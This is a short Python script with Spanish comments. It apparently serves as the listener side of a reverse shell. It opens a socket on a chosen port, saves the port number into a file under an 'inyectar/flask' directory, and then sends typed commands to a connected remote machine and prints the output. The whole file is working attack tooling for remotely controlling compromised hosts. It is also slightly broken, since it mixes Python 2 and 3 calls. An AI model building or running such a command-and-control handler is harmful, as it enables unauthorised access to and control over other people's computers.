import socket
host = ''
port = int(input("Puerto: "))
puerto = open('../inyectar/flask/p/puerto.txt','w')
p = puerto.write(str(port))
puerto.close()

#Crear socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#Enlazar
s.bind((host,port))
#Aceptar con + n max
s.listen(10)
print("=================================")
print ("Estableciendo conexion...")
print("=================================")
def aceptar_conexiones():
 conn,addr = s.accept()
 print("===================================")
 print("Conexion establecida : "+str(addr[0]))
 print("===================================")
 comandos(conn)
 conn.close()
 print("================================")
 print("Fin de la conexion")
 print("================================")
def comandos(conn):
 while True:
  cmd = raw_input("$ ")
  if str.encode(cmd) == "q":break
  if len(str.encode(cmd)) > 0:
   conn.send(str.encode(cmd))
   respuesta = str(conn.recv(1024))
   print(respuesta)
aceptar_conexiones()
